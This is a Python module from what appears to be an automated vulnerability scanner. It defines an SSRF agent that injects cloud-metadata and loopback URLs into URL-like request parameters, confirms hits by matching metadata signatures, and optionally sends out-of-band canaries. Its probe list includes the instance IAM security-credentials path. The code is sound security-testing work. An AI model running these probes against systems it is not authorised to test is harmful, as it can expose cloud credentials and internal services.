"""SSRF agent: probes cloud metadata endpoints and internal/loopback addresses
through URL-shaped parameters. Only reports `found=True` on unambiguous
content confirmation (a metadata signature reflected back) -- pure timing
anomalies or an unconfirmed OOB canary are noted but not reported, since
"no exploit, no report" means we don't get to guess.
"""
from __future__ import annotations

import uuid

from noctis.agents.base_agent import AgentResult
from noctis.agents.http_agent import HttpAgent
from noctis.agents.targeting import apply_payload, baseline_request

SSRF_PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
]
METADATA_SIGNATURES = [
    "ami-id", "instance-id", "security-credentials", "iam/",
    "local-ipv4", "placement/", "hostname",
]
URL_PARAM_HINTS = ("url", "uri", "link", "redirect", "callback", "webhook", "target", "dest", "endpoint")


class SSRFAgent(HttpAgent):
    agent_type = "ssrf"

    async def run(self) -> AgentResult:
        if self.target is None or not self.target.param_names:
            return self.no_target_result()

        params = self._ordered_params()
        baseline_url, baseline_body = baseline_request(self.target)
        try:
            await self.client.request(self.target.method, baseline_url, data=baseline_body)
        except Exception:
            pass  # baseline failure shouldn't block probing

        candidate_notes: list[str] = []

        for param in params:
            for probe in SSRF_PROBES:
                url, body = apply_payload(self.target, param, probe)
                try:
                    response = await self.client.request(self.target.method, url, data=body)
                except Exception:
                    continue

                signature = self._matched_signature(response.text)
                if signature:
                    async def recheck(u=url, b=body, sig=signature) -> bool:
                        r = await self.client.request(self.target.method, u, data=b)
                        return sig in r.text.lower()

                    self._recheck = recheck
                    return AgentResult(
                        found=True,
                        payload=probe,
                        request=self._format_request(self.target.method, url, body),
                        response=self._format_response(response),
                        evidence=f"metadata signature '{signature}' reflected via param '{param}' -> SSRF confirmed",
                    )

            if self.context.settings.interactsh_server:
                canary = f"http://{uuid.uuid4().hex[:12]}.{self.context.settings.interactsh_server}/"
                url, body = apply_payload(self.target, param, canary)
                try:
                    await self.client.request(self.target.method, url, data=body)
                    candidate_notes.append(f"param '{param}': sent OOB canary {canary} (check interactsh for a callback)")
                except Exception:
                    continue

        notes = "; ".join(candidate_notes) if candidate_notes else f"no SSRF confirmed across {len(params)} param(s)"
        return AgentResult(found=False, notes=notes)

    def _ordered_params(self) -> list[str]:
        url_like = [p for p in self.target.param_names if any(h in p.lower() for h in URL_PARAM_HINTS)]
        rest = [p for p in self.target.param_names if p not in url_like]
        return url_like + rest

    @staticmethod
    def _matched_signature(text: str) -> str | None:
        lowered = text.lower()
        for sig in METADATA_SIGNATURES:
            if sig in lowered:
                return sig
        return None
